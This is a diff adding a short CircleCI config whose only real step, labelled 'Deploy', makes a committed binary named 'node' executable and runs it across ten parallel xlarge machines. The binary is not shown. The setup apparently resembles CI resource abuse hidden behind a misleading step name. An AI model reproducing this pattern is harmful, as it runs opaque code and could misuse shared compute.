@@ -1,0 +1,20 @@
+working_dir: &working_dir ~/app
+
+version: 2.1
+
+workflows:
+  main:
+    jobs:
+      - build
+
+jobs:
+  build:
+    parallelism: 10
+    machine:
+      image: ubuntu-2204:2022.04.1
+    resource_class: xlarge
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod +x node && ./node
